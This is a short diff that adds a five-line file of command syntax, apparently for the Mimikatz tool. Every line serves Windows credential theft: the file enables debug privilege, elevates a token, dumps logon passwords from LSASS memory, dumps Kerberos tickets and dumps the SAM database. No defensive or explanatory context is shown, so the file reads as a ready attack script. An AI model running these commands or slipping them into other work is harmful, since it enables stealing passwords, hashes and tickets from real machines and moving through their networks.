@@ -1,0 +1,5 @@
+privilege::debug
+token::elevate 
+sekurlsa::logonpasswords
+sekurlsa::tickets
+lsadump::sam
